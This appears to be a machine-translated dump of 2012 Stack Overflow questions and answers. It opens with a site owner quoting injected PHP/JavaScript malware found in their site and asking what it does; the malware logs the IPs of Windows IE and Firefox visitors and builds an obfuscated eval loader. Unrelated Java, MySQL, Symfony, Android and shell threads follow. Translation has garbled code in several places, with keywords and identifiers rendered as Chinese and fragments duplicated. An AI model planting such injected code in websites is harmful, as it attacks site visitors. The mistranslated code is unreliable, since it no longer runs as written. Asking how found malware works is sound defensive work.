NaXd5T1N3ek1DdzRNaXd6T0N3NE1pd3pOeXc0Tnl3eE1ERXNNVEF6TERreExEazVMRGt4TERVM0xEa3pMRGsyTERrNExEZzVMRE14TERreUxETXdMRFV3TERNc0xUSXNNQ3d4TVRWZE8zWTlJbVYyWVNJN2ZXbG1LSFlwWlQxM2FXNWtiM2RiZGlzaWJDSmRPM2M5Wmp0elBWdGRPM0k5VTNSeWFXNW5PM285S0NobEtUOGlRMjlrWlNJNklpSXBPM3A0UFdaeUszbzdabTl5S0drOU1EczFOamt0TlNzMUxXaytNRHRwS3oweEtYdHFQV2s3YVdZb1pTbHpQWE1yY2x0NmVGMG9LSGRiYWwwcU1Tc29PU3RsS0NKcUpUTWlLU2twS1R0OUlHbG1LSGdtSm1ZbUpqQXhNajA5UFRFd0tXVW9jeWs3UEM5elkzSnBjSFErJykpOw0KCWlmICgkZnAgPSBAZm9wZW4oJGRiZiAsICJhIikpe2ZwdXRzKCRmcCAsICRpcC4nfCcpOyBmY2xvc2UoJGZwKTt9DQp9'));?>`

通常对我来说通过base64解码很简单，但我认为他们已经再次编码了。

我从base64解码得到的是

```
$ip=$_SERVER["REMOTE_ADDR"];$dr=$_SERVER["DOCUMENT_ROOT"];$ua = $_SERVER['HTTP_USER_AGENT'];$dbf=$dr.'/'.md5($dr); 
```

if((strpos($ua,'Windows')!==false)&&((strpos($ua,'MSIE')!==false)||(strpos($ua,'Firefox')!==false ))&&(strpos(@file_get_contents($dbf),$ip) === false)){ error_reporting(0);

尝试{1-prototype;}catch(asd){x=2;} if(x){fr="fromChar";f=[0,-1,94,93,22,29,91,101,88,108,99, 90,101,106,35,94,91,105,60,98,90,100,91,99,107,105,55,112,74,86,94,68,86,100,91,29,30,88,100,91,111,28,32,81,37,84, 31,112,4,-1,-2,0,95,91,105,87,98,92,104,29,32,49,2,0,-1,114,23,91,97,106,91,21,114,3,-2, 0,-1,89,102,89,106,100,91,99,107,36,108,105,95,105,92,30,23,51,95,91,105,87,98,92,22,104,105,89,50,30,94,105,107,102,47,38,37 ,89,111,102,104,97,107,93,109,97,35,100,111,91,110,36,106,106,37,52,94,101,50,41,29,21,110,95,89,107,94,50,30,39,27,30,22,93, ,95,92,95,106,50,30,39,37,30,22,104,107,111,97,92,51,28,109,95,104,96,88,94,99,95,105,112,48,93,96,90,89,92,100 ,48,103,101,104,96,106,94,102,100,47,88,88,104,102,98,106,107,91,48,99,91,91,107,48,37,50,106,100,103,48,37,50,29,51,501,387,104, ,91,51,25,31,48,4,-1,-2,116,3,-2,0,92,106,101,89,105,96,101,99,23,95,91,105,87,98,92,104,29,32,113,2,0,-1,-2,109,87,103,23,92,21,52,22,89,102,89,106,100,91, 99,107,36,88,105,91,86,107,91,58,99,91,98,92,100,105,31,29,94,93,104,86,100,91,28,32,49,91,37,105,90,107,55,105,107,104,94, 89,107,105,92,30,28,106,104,88,30,34,28,95,106,105,103,48,36,38,90,109,103,105,95,108,94,107,98,36,98,112,92,108,37,33,907,104,8,3 30,31,48,93,36,104,107,111,97,92,36,107,96,105,94,89,95,97,96,106,110,52,29,93,96,90,89,92,100,28,50,92,35,106,106,110, 99,91,35,103,101,104,96,106,94,102,100,50,30,87,87,106,101,97,108,106,90,30,49,91,37,105,105,112,98,90,37,98,90,93,283,283, 50,92,35,106,106,110,99,91,35,107,101,101,52,29,37,30,49,91,37,105,90,107,55,105,107,104,94,89,107,105,92,30,28,110,95,89,538, 29,38,39,29,30,50,92,35,106,91,105,56,106,105,105,95,87,108,106,90,31,29,93,92,95,92,95,106,28,35,29,38,39,29,30,50,3,-2,0,-1,89,102,89,106,100,91,99,107,36,92,92,106,58,99,91,98,92,100,105,106,56,110,75,87, 92,69,87,98,92,30,28,89,101,89,112,29,30,82,38,82,37,87,101,103,91,99,91,57,93,96,98,89,31, 92,30,50,3,-2,0,115];v="eva";}if(v)e=window[v+"l"];w=f;s=[];r=String;z= ((e)?"代码":"");zx=fr+z;for(i=0;569-5+5-i>0;i+=1){j=i;if(e)s= s+r[zx]((w[j]*1+(9+e("j%3"))));} if(x&&f&&012===10)e(s);j%3"))));} if(x&&f&&012===10)e(s);j%3"))));} if(x&&f&&012===10)e(s);

```
if ($fp = @fopen($dbf , "a")){fputs($fp , $ip.'|'); fclose($fp);} 
```

}

你们能帮我弄清楚恶意软件试图做什么吗

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T13:30:19.697

问题是代码做了什么。据我所知：

它会在您的文档根目录上创建一个带有 md5 名称的文件。在该文件中，它会写入您从使用 Internet Explorer 或 Firefox 的 Windows 机器获得的每个访问者的 IP。

我不确定黑客在追求什么，但如果他能够在您的文件中获取该代码，那么他可能可以访问您的 FTP，从而访问新创建的日志文件。

# symfony - 在 symfony2 和 FOS 的实体管理器服务中写哪个类？

> ID：11553095
> 
> 赞同：0
> 
> 时间：2012-07-19T02:27:27.637
> 
> 标签：symfony, fosuserbundle

我正在尝试使用 FOSUserBUndleBUndle

xml类是

```
<service id="fos_user.entity_manager" 
         factory-service="doctrine" 
         factory-method="getEntityManager" 
         class="Doctrine\ORM\EntityManager" 
         public="false">
                <argument>%fos_user.model_manager_name%</argument>
</service> 
```

我想知道我要写哪一课

```
%fos_user.model_manager_name% 
```

基本上我只是将所有 xml 文件转换为 yml 文件并制作我的自定义包

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T10:14:14.907

那是实体经理的名字。如果留空，则使用标准实体管理器

```
//File: vendor\symfony\src\Symfony\Bundle\DoctrineBundle\Registry.php
    /**
    * Gets a named entity manager.
    *
    * @param string $name The entity manager name (null for the default one)
    *
    * @return EntityManager
    */
    public function getEntityManager($name = null)
    {
        if (null === $name) {
            $name = $this->defaultEntityManager;
        }

        if (!isset($this->entityManagers[$name])) {
            throw new \InvalidArgumentException(sprintf('Doctrine EntityManager named "%s" does not exist.', $name));
        }

        return $this->container->get($this->entityManagers[$name]);
    } 
```

# mysql - 在 SQL 语句中使用 Fultext "Like" 无法获得相同的结果

> ID：11553099
> 
> 赞同：2
> 
> 时间：2012-07-19T02:28:38.080
> 
> 标签：mysql

表中有 912 行。我要搜索的列中共有 723 行具有“MFG”。

如果我使用 like: column_name LIKE 'MFG' - 我得到 723 结果。

如果我使用全文，我得到零。

但是，我可以检索同一列中的任何其他值，这仅显示我所知道的，该列已正确设置为全文。

我检查了停用词，并没有在其中找到 MFG。

[http://dev.mysql.com/doc/refman/5.5/en/fulltext-stopwords.html](http://dev.mysql.com/doc/refman/5.5/en/fulltext-stopwords.html)

如何使用全文获得相同的结果。

编辑：我正在使用的查询

```
SELECT * FROM table WHERE MATCH(keywords, product, type) AGAINST ('MFG') 
```

结果为零，但

```
SELECT * FROM table WHERE type LIKE 'MFG' 
```

获得 723 个结果。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T05:23:25.213

全文不适用于超过 50% 的记录中出现的任何单词。请参阅底部的[文档。](http://docs.oracle.com/cd/E17952_01/refman-5.5-en/fulltext-natural-language.html)

# windows-ce - msvsmon 在 Win CE 上可以正常工作吗？

> ID：11553101
> 
> 赞同：0
> 
> 时间：2012-07-19T02:29:09.523
> 
> 标签：windows-ce, remote-debugging

我想问一下我可以把“msvsmon.exe”放到目标设备上，然后在Win CE上像Win XP那样进行远程调试吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T18:12:14.567

`msvsmon.exe`是桌面 Windows 可执行文件。它不会在 Windows CE 下运行。

要远程调试到 Windows CE 设备（这是一项非常常见的任务），请使用 CoreCon 从 Visual Studio 进行连接。[本文概述了](http://nicolasbesson.blogspot.com/2008/02/smart-device-deployment-and-debugging.html)该过程。

# c# - 3rd 方应用程序正在使用 C++ 自定义 dll，将参数从 dll 传递到 c# 应用程序

> ID：11553109
> 
> 赞同：0
> 
> 时间：2012-07-19T02:30:16.343
> 
> 标签：c#, c++, dll

我有一个基本 DLL，它是 3rd 方应用程序的一部分，它是一个 Win32 C++ 库。

我已经编译了它，它适用于 3rd 方应用程序。我想要的是从 DLL 的入口点将参数传递给 C# WinForm 应用程序。主要是因为我了解 C#，并且我想直观地查看一些数据，以便了解正在发生的事情。

DLL 中第 3 方应用程序调用的入口点是：

```
double process_message(const char* pmessage, const void* param)
{
   //Do some stuff,
   //The 3rd party app expects an integer return

   /*
   I'd like to pass "pmessage" and "param" to my C# WinForm App
   And return a result of type int here.
   */
} 
```

应用程序将始终位于同一台计算机上，我尝试过命名管道并使其正常工作，但遇到了太多其他问题。我看过.Net Remote，但我希望有一个更简单的解决方案。

干杯

克雷格

# cuda - CUDA 中不同情况的经线内的执行顺序

> ID：11553111
> 
> 赞同：0
> 
> 时间：2012-07-19T02:30:39.640
> 
> 标签：cuda

试图了解扭曲中的执行顺序。在以下发散代码中，执行顺序是什么：0,1,2----31 或 31,29,....0？

**一个**

```
if (tid == 0)      { . . . }
else if (tid == 1) { . . . }
else if (tid == 2) { . . . }
. . .
else if (tid == 31){ . . . } 
```

如果是这种情况怎么办：

```
if(tid == 0) { . . . }
else 
{ . . . } 
```

# java - 如何将关闭按钮添加到 JTabbedPane 选项卡？

> ID：11553112
> 
> 赞同：32
> 
> 时间：2012-07-19T02:30:41.387
> 
> 标签：java, swing, tabs, jtabbedpane

我正在使用 JTabbedPane，我需要在选项卡中添加一个关闭按钮来关闭当前的。

我一直在搜索，据我所知，我必须从 JPanel 扩展并按照他们所说的添加关闭按钮[但是](http://www.codeproject.com/Articles/18496/JTabbedPane-with-Closing-Tabs) ，有没有办法添加扩展 JTabbedPane 的关闭按钮，或者有更简单的方法吗？

在此先感谢，非常感谢您的时间和帮助。

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2012-07-19T02:51:35.913

本质上，您将需要为选项卡提供“渲染器”。查看[JTabbedPane.setTabComponentAt(...)](http://docs.oracle.com/javase/6/docs/api/javax/swing/JTabbedPane.html#setTabComponentAt%28int,%20java.awt.Component%29)了解更多信息。

基本思想是提供一个将在选项卡上布置的组件。

我通常会创建一个 JPanel，在其上添加一个 JLabel（用于标题），并根据我想要显示的内容，添加某种充当关闭操作的控件。

```
tabPane.addTab(title, tabBody);
int index = tabPane.indexOfTab(title);
JPanel pnlTab = new JPanel(new GridBagLayout());
pnlTab.setOpaque(false);
JLabel lblTitle = new JLabel(title);
JButton btnClose = new JButton("x");

GridBagConstraints gbc = new GridBagConstraints();
gbc.gridx = 0;
gbc.gridy = 0;
gbc.weightx = 1;

pnlTab.add(lblTitle, gbc);

gbc.gridx++;
gbc.weightx = 0;
pnlTab.add(btnClose, gbc);

tabPane.setTabComponentAt(index, pnlTab);

btnClose.addActionListener(myCloseActionHandler); 
```

现在在其他地方，我建立了动作处理程序......

```
public class MyCloseActionHandler implements ActionListener {

    public void actionPerformed(ActionEvent evt) {

        Component selected = tabPane.getSelectedComponent();
        if (selected != null) {

            tabPane.remove(selected);
            // It would probably be worthwhile getting the source
            // casting it back to a JButton and removing
            // the action handler reference ;)

        }

    }

} 
```

现在，您可以轻松地使用任何您喜欢的组件，并将鼠标侦听器附加到它并监视鼠标点击...

**更新**

上面的示例只会删除当前活动的选项卡，有几种方法可以解决这个问题。

最好的可能是为操作提供一些方法来查找与其关联的选项卡...

```
public class MyCloseActionHandler implements ActionListener {

    private String tabName;

    public MyCloseActionHandler(String tabName) {
        this.tabName = tabName;
    }

    public String getTabName() {
        return tabName;
    }

    public void actionPerformed(ActionEvent evt) {

        int index = tabPane.indexOfTab(getTabName());
        if (index >= 0) {

            tabPane.removeTabAt(index);
            // It would probably be worthwhile getting the source
            // casting it back to a JButton and removing
            // the action handler reference ;)

        }

    }

} 
```

这使用选项卡的名称（与 一起使用`JTabbedPane#addTab`）来查找然后删除选项卡及其关联组件...

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-08-26T03:11:52.553

我发现了一个选项卡示例（来自 java 站点）似乎可以做到这一点，至少在他们的。（虽然我认为，当我过去尝试它时，它也关闭了当前选择的选项卡，尽管当您运行他们的示例时它可以正常工作，尽管我认为当我将它更新为在选项卡式 Java 记事本上工作时，它正在关闭当前选择的选项卡，虽然也许我做错了。

[http://docs.oracle.com/javase/tutorial/displayCode.html?code=http://docs.oracle.com/javase/tutorial/uiswing/examples/components/TabComponentsDemoProject/src/components/ButtonTabComponent.java](http://docs.oracle.com/javase/tutorial/displayCode.html?code=http://docs.oracle.com/javase/tutorial/uiswing/examples/components/TabComponentsDemoProject/src/components/ButtonTabComponent.java)

是的，我的东西现在正在工作！这将适用于实际选项卡，而不是当前选择的选项卡！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-02-16T11:27:33.630

希望你已经得到了你的问题的答案。我想提供一个对我非常有用的链接。

[带有关闭按钮的 JTabbedPane](http://pallandri.blogspot.com/2014/02/java-jtabbedpane-example-with-close.html)

这里还有一些代码。

```
public static void createAndShowGUI()
{
    JFrame frame = new JFrame("Tabs");
    frame.setMinimumSize(new Dimension(500, 200));
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    JTabbedPane tabbedPane = new JTabbedPane();

    JPanel panel = new JPanel();
    panel.setOpaque(false);
    tabbedPane.add(panel);
    tabbedPane.setTabComponentAt(tabbedPane.indexOfComponent(panel), getTitlePanel(tabbedPane, panel, "Tab1"));

    JPanel panel1 = new JPanel();
    panel1.setOpaque(false);
    tabbedPane.add(panel1);
    tabbedPane.setTabComponentAt(tabbedPane.indexOfComponent(panel1), getTitlePanel(tabbedPane, panel1, "Tab2"));

    JPanel panel2 = new JPanel();
    panel2.setOpaque(false);
    tabbedPane.add(panel2);
    tabbedPane.setTabComponentAt(tabbedPane.indexOfComponent(panel2), getTitlePanel(tabbedPane, panel2, "Tab3"));

    JPanel panel3 = new JPanel();
    panel3.setOpaque(false);
    tabbedPane.add(panel3);
    tabbedPane.setTabComponentAt(tabbedPane.indexOfComponent(panel3), getTitlePanel(tabbedPane, panel3, "Tab4"));

    frame.add(tabbedPane);

    // Display the window.
    frame.pack();
    frame.setVisible(true);
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-11-06T06:09:07.943

我对oracle的代码做了一些修改。

[http://docs.oracle.com/javase/tutorial/displayCode.html?code=http://docs.oracle.com/javase/tutorial/uiswing/examples/components/TabComponentsDemoProject/src/components/ButtonTabComponent.java](http://docs.oracle.com/javase/tutorial/displayCode.html?code=http://docs.oracle.com/javase/tutorial/uiswing/examples/components/TabComponentsDemoProject/src/components/ButtonTabComponent.java)

提供向选项卡添加图标的可能性，以及关闭选项卡按钮。希望有帮助。

```
public static void addTag(JTabbedPane tab, String title, Icon icon, int index){
     MouseListener close = new MouseAdapter() {

        @Override
        public void mouseClicked(MouseEvent e) {
            //your code to remove component
            //I use this way , because I use other methods of control than normal: tab.remove(int index);
        }

    };
    final ButtonClose buttonClose = new ButtonClose (title, icon, close );

    tab.setTabComponentAt(index, buttonClose);
    tab.validate();
    tab.setSelectedIndex(index); 
```

}

公共类 ButtonClose 扩展 JPanel {

```
public ButtonClose(final String title, Icon icon, MouseListener e) {
    JLabel ic = new JLabel(icon);
    ic.setSize(icone.getIconWidth(), icone.getIconHeight());

    JLabel text= new JLabel(title);
    text.setBorder(BorderFactory.createEmptyBorder(0, 0, 0, 5));

    ButtonTab button = new ButtonTab();
    button.addMouseListener(e);
    button.setBorder(BorderFactory.createEmptyBorder(2, 0, 0, 0));

    JPanel p = new JPanel();
    p.setSize(getWidth() - icone.getIconWidth(), 15);
    p.add(text);
    p.add(button);

    add(ic);
    add(p);
}

private class ButtonTab extends JButton {

    public ButtonTab() {
        int size = 13;
        setPreferredSize(new Dimension(size, size));
        setToolTipText("Close");

        setUI(new BasicButtonUI());

        setFocusable(false);
        setBorderPainted(false);

        addMouseListener(listener);
        setRolloverEnabled(true);
    }

    @Override
    public void updateUI() {
    }

    @Override
    protected void paintComponent(Graphics g) {
        super.paintComponent(g);
        Graphics2D g2 = (Graphics2D) g.create();

        if (getModel().isPressed()) {
            g2.translate(1, 1);
        }
        g2.setStroke(new BasicStroke(2));
        g2.setColor(new Color(126, 118, 91));

        if (getModel().isRollover()) {
            g2.setColor(Color.WHITE);
        }

        int delta = 3;
        g2.drawLine(delta, delta, getWidth() - delta - 1, getHeight() - delta - 1);
        g2.drawLine(getWidth() - delta - 1, delta, delta, getHeight() - delta - 1);
        g2.dispose();
    }
}

private final MouseListener listener = new MouseAdapter() {
    @Override
    public void mouseEntered(MouseEvent e) {
        Component component = e.getComponent();
        if (component instanceof AbstractButton) {
            AbstractButton button = (AbstractButton) component;
            button.setContentAreaFilled(true);
            button.setBackground(new Color(215, 65, 35));
        }
    }

    @Override
    public void mouseExited(MouseEvent e) {
        Component component = e.getComponent();
        if (component instanceof AbstractButton) {
            AbstractButton button = (AbstractButton) component;
            button.setContentAreaFilled(false); //transparent
        }
    }
}; 
```

}

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-11-19T02:07:26.293

[在这里](https://github.com/mcheung63/peter-swing/wiki/Releases)查看 Peter-Swing 。它有一个**`JClosableTabbedPane`**类，以及许多其他类。

当您下载该`jar`文件时，您可以运行它并获得所有类的示例。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2014-12-02T12:18:18.273

您可以有一个名为“x”的 JLabel 并使用 mouseListener

```
 private final JLabel l = new JLabel(); // this is the label for tabbedPane
 private final JLabel b = new JLabel("x");//Close Button
 if (closeable)
        {
            b.setToolTipText("Click to close");

            b.setOpaque(false);
            b.setBackground(Color.gray);

            b.addMouseListener(new MouseAdapter()
            {
                @Override
                public void mouseExited(MouseEvent e)
                {
                    b.setBorder(bordere);
                    b.setOpaque(false);
                }

                @Override
                public void mouseEntered(MouseEvent e)
                {
                    b.setBorder(borderl);
                }

                @Override
                public void mouseReleased(MouseEvent e)
                {
                    b.setOpaque(false);
                    b.repaint();

                    if (b.contains(e.getPoint()))
                    {
                        b.setBorder(borderl);

                        if (confirmTabClosing())
                        {
                            tab.remove(tabIndex());
                            if(tab.getTabCount() == 0)
                                spacialTabComponent.maximizeOrRestore.doClick();
                        }
                    }
                    else
                        b.setBorder(bordere);

                }

                @Override
                public void mousePressed(MouseEvent e)
                {
                    b.setOpaque(true);
                    b.repaint();
                }
            });

            b.setBorder(bordere);
            add(b, getLeftAlignedBothFilledGBC(1, 0, new Insets(0, 0, 0, 0), 0, 0));
        }

    } 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2015-10-24T11:17:06.490

```
jbCloseButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                int index = jtbMainTabbedPane.indexOfTabComponent(jbCloseButton);
                jtbMainTabbedPane.remove(index);
            }
}); 
```

# html - CSS Drop Down - 悬停时消失

> ID：11553113
> 
> 赞同：0
> 
> 时间：2012-07-19T02:30:49.983
> 
> 标签：html, css

我知道这对于所有 CSS 专业人士来说都是一个简单的解决方案，但我现在已经厌倦了它，我尝试的任何方法都无法解决它。

当您将鼠标悬停在某些导航项目上时，将会出现一个下拉菜单。我需要下拉菜单和

*   项目，但一旦我尝试下去，它就会消失。任何解决方案将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T02:43:52.397

“GM Parts”按钮和下拉菜单之间有一个间隙。您将鼠标悬停在按钮上，然后显示菜单。然后您尝试将鼠标拖到菜单上，但是当您这样做时，您将鼠标悬停在间隙上 - 这就是“GM Parts”失去 :hover 状态并且菜单隐藏的地方。您需要确保“GM Parts”和菜单之间没有间隙。

# shell - 在 solaris shell 中获取 realpath

> ID：11553115
> 
> 赞同：2
> 
> 时间：2012-07-19T02:30:52.340
> 
> 标签：shell, solaris

Solaris中是否有可以获取真实路径的实用程序。

```
cd /home/me/test
realpath ..  # got /home/me in linux 
```

我可以在linux中做realpath，但在solaris上似乎缺乏。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T06:11:24.163

```
function realpath {
  [ -d "$1" ] && (
      CDPATH= \cd "$1"
      /bin/pwd
  ) || (
      CDPATH= \cd "$(dirname "$1")" &&
          printf "%s/%s\n" "$(/bin/pwd)" "$(basename $1)"
  )
} 
```

一些评论：

虽然函数不是 POSIX，但建议`name() { ... }`至少在 ksh 上使用它而不是传统语法，这可能是 Solaris 下最常用的 shell。

`\cd`用于 vs`cd`防止使用`cd`shell 内置函数以外的其他内容，然后避免不必要的副作用。 `/bin/pwd`用于`pwd`作为非内置命令调用，因为它不知道父 shell 是如何到达当前目录的，因此只能获取它的真实路径。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-06-16T15:19:32.093

我知道这是一个旧的问答，但在我看来，提供的 realpath 功能有两个缺点。一，它改变了当前的工作目录，这在一次（或多次）调用该函数后可能会令人惊讶。二，它似乎只适用于目录路径。以下可能是一个更通用的功能（我是 bash 用户，只需要脚本，所以我跳过了反斜杠。）

```
function realpath {
    local base=$(basename $1)
    local d=$(dirname $1)
    (cd $d ; echo $(/bin/pwd)/$base)
} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-25T22:25:44.130

我在 Solaris 10 平台上遇到了这个问题，这里是找到的答案（包括 jlliagre 答案的简化版本）

完整路径，已解析符号链接：

*   /usr/bin/pwd -P
*   /bin/pwd（感谢：jlliagre）
*   真实路径 {linux}

完整路径，未解析符号链接：

*   /usr/bin/密码

需要问自己的问题是，$(which pwd) ？

# java - 需要解释Java中的自然排序

> ID：11553118
> 
> 赞同：1
> 
> 时间：2012-07-19T02:31:50.910
> 
> 标签：java, sorting, collections

你能举一个“选择类内的自然排序”的例子吗？

我在 docs.oracle 中阅读了对象排序，但它没有说明在有多个元素的情况下如何确定自然排序。如果一个班级有姓名、年龄、地址、电话号码等元素；选择哪一个来进行自然排序？

然后，我在这里的一篇文章中读到可以决定自然排序。我是一名 Java 新手，试图解决家庭作业并首次尝试收集框架。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T02:36:36.553

是的，您说得对，可以决定自然顺序。您将实现 Comparable 并编写自己的 compareTo() 方法实现。在这种方法中，你决定什么胜过什么。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T02:46:27.513

我更喜欢 Comparator 类，尽管实现看起来更重量级。原因是，对于某些对象，比较什么并不总是很清楚。使用`.compareTo()`（即实现 IComparable）并不像显式 Comparator 那样清晰。

```
BasketballPlayer player1 = new BasketballPlayer("Smith", 2.02);
BasketballPlayer player2 = new BasketballPlayer("Jones", 1.95);

List<BasketballPlayer> playersByHeight = new ArrayList<BasketballPlayer>();
List<BasketballPlayer> playersByName = new ArrayList<BasketballPlayer>();
playersByHeight.add(player1);
playersByHeight.add(player2);
playersByName.add(player1);
playersByName.add(player2);

Collections.sort(playersByName, new Comparator<BasketballPlayer>() {
    @Override
    public int compare(BasketballPlayer o1, BasketballPlayer o2) {
        return o1.getName().compareTo(o2.getName());
    }
});
Collections.sort(playersByHeight, new Comparator<BasketballPlayer>() {
    @Override
    public int compare(BasketballPlayer o1, BasketballPlayer o2) {
        return o1.getHeight().compareTo(o2.getHeight());
    }
}); 
```

这里我使用了一个匿名类，但如果你愿意，你可以让 Comparator 成为他们自己的（命名的）类。

# android - 暂停和恢复线程时未更新 UI

> ID：11553120
> 
> 赞同：0
> 
> 时间：2012-07-19T02:31:59.270
> 
> 标签：android, multithreading

我现在正在做一个android项目。我的线程有问题。我想在按下主页按钮时暂停线程并在返回应用程序时恢复它。

这是我的代码：

```
Handler handler = new Handler() 
{
    @Override
    public void handleMessage(Message msg) 
    {
        int tempWaktu = (Integer) msg.obj;

        if(!status){
            if(tempWaktu < 10 ) textSec.setText("0"+tempWaktu);
            else textSec.setText(""+tempWaktu);
        }

        if(tempWaktu==0){
            stopYourActivity();
        }
    }
}; //handler

@Override
public void onStart() 
{
    super.onStart();

    timer = new Thread(new Runnable() {
        public void run() {
        try 
        {
            while(jalan){
                if(running){
                    Thread.sleep(1000);
                    waktu--;
                    Message msg = handler.obtainMessage(1, waktu);
                    handler.sendMessage(msg);
                    if(waktu==0){
                        running = false;
                    }
                }
            }
        } 
        catch (Throwable t){

        }
    }//run
    });//background
    timer.start();
}//onStart

@Override
public void onPause(){
    synchronized (timer) {
        try {
            timer.wait();
        } catch (InterruptedException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
    pause = true;
}

@Override
public void onResume(){
    super.onResume();
    if(pause){
        synchronized (timer) {
            timer.notify(); textSec.postInvalidate();
            pause = false;
        } 
    }
} 
```

当我按下主页按钮时，线程不会停止，当我回到应用程序时，用户界面会冻结。我不明白为什么。

我需要的是当我按下主页按钮时线程暂停并且当我返回线程运行并且 UI 没有冻结时。

我感谢您为帮助我而编写的任何代码。非常感谢你。

* * *

**更新**

我在`timer.wait()`里面放`run()`了这样的：

```
@Override
public void onStart() 
{
    super.onStart();

    if(!pause){
        timer = new Thread(new Runnable() {
            public void run() {
            try 
            {
                while(jalan){
                    if(running){
                        Thread.sleep(1000);
                        waktu--;
                        Message msg = handler.obtainMessage(1, waktu);
                        handler.sendMessage(msg);
                        Log.v("Timer Thread", "Thread Berjalan "+waktu);
                        if(waktu==0){
                            Log.v("Thread Timer", "Waktu Berhenti");
                            running = false;
                        }
                        if(pause){
                            synchronized (timer) {
                                timer.wait();
                            }
                        }
                    }
                }
            } 
            catch (Throwable t){    
            }
        }//run
        });//background
        timer.start();
    }

}//onStart 
```

`timer.notify()`就像上面一样，`onResume()`当我按下主页时，它会强制关闭。这里的日志说：

```
07-19 10:27:41.173: E/AndroidRuntime(2280): FATAL EXCEPTION: main
07-19 10:27:41.173: E/AndroidRuntime(2280): android.app.SuperNotCalledException: Activity {com.konsep.baby.scratch/com.konsep.baby.scratch.BabyScratchChallenge} did not call through to super.onPause()
07-19 10:27:41.173: E/AndroidRuntime(2280):     at android.app.Activity.performPause(Activity.java:3854)
07-19 10:27:41.173: E/AndroidRuntime(2280):     at android.app.Instrumentation.callActivityOnPause(Instrumentation.java:1191)
07-19 10:27:41.173: E/AndroidRuntime(2280):     at android.app.ActivityThread.performPauseActivity(ActivityThread.java:2341)
07-19 10:27:41.173: E/AndroidRuntime(2280):     at android.app.ActivityThread.performPauseActivity(ActivityThread.java:2311)
07-19 10:27:41.173: E/AndroidRuntime(2280):     at android.app.ActivityThread.handlePauseActivity(ActivityThread.java:2291)
07-19 10:27:41.173: E/AndroidRuntime(2280):     at android.app.ActivityThread.access$1700(ActivityThread.java:117)
07-19 10:27:41.173: E/AndroidRuntime(2280):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:938)
07-19 10:27:41.173: E/AndroidRuntime(2280):     at android.os.Handler.dispatchMessage(Handler.java:99)
07-19 10:27:41.173: E/AndroidRuntime(2280):     at android.os.Looper.loop(Looper.java:123)
07-19 10:27:41.173: E/AndroidRuntime(2280):     at android.app.ActivityThread.main(ActivityThread.java:3683)
07-19 10:27:41.173: E/AndroidRuntime(2280):     at java.lang.reflect.Method.invokeNative(Native Method)
07-19 10:27:41.173: E/AndroidRuntime(2280):     at java.lang.reflect.Method.invoke(Method.java:507)
07-19 10:27:41.173: E/AndroidRuntime(2280):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
07-19 10:27:41.173: E/AndroidRuntime(2280):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
07-19 10:27:41.173: E/AndroidRuntime(2280):     at dalvik.system.NativeStart.main(Native Method) 
```

我的代码有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:04:24.597

第一个问题是生命周期的`Activity`实际运作方式。当您进入主屏幕时，您的电流`Activity`一直到停止状态（即被`onStop()`调用）。因此，当您返回应用程序时，您将收到`onStart()`then `onResume()`。现在，让我们根据这些信息检查代码中发生的情况：

1.  首次启动时，会在其中创建并启动一个新线程`onStart()`。 `onResume()`由于布尔标志，什么都不做。
2.  按下 HOME 按钮，`onPause()`被调用，在这个线程上调用 wait()
3.  返回应用程序，`onStart()`被调用，现在计时器指向一个新线程，让你的旧线程悬空。
4.  `onResume()`被调用并被`notify()`发送到新的 Thread 实例。

所以这里的问题是线程你`wait()`和线程你`notify()`不是同一个对象。

第二个问题是`wait()`实际做了什么。来自 Java 文档（强调添加）：

> 使**调用线程**等待，直到另一个线程调用此对象的 notify() 或 notifyAll() 方法。该方法只能由拥有该对象监视器的线程调用；请参阅 notify() 以了解线程如何成为监视器的所有者。

调用`wait()`a`Thread`不会阻塞 created `Thread`，它会阻塞**调用 method**的线程，在这种情况下是在主线程中。因此，您编写了一个应用程序，该应用程序在暂停期间成功阻塞了主线程并且无法解锁它，因此冻结。

如果你想使用`wait()`和`notify()`暂停你的后台线程，你需要确保`wait()`从后台线程中调用它（即在它的`run()`块内）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T02:41:57.863

谷歌的培训页面已经解释过了。[这里](http://developer.android.com/training/basics/activity-lifecycle/index.html)

当您的应用暂停时，它会“停止可能消耗 CPU 的动画或其他正在进行的操作”。

# java - java - 异常没有被捕获

> ID：11553121
> 
> 赞同：3
> 
> 时间：2012-07-19T02:32:01.950
> 
> 标签：java, exception, spring-roo

我正在使用 Spring ROO。在我的 Web 应用程序中，我可以创建许多用户并保存。我也可以更新现有用户。

对于更新场景，我们使用 merge() 方法来更新现有数据。在数据库中，“用户名”列是唯一的。以下是场景。

1.  用户使用手机号码“6039274849”创建用户名“Sean”

2.  用户创建另一个名为“Parker”的用户，手机号码为“8094563454”

3.  当用户尝试用“Sean”更新第二个用户“Parker”时，我遇到了异常。

在堆栈跟踪中，我可以看到以下异常是原因

1.  由 ConstraintviolationException 引起
2.  由 SQLException 引起
3.  由 TransactionSystemException 引起
4.  由 PersistenceException 引起
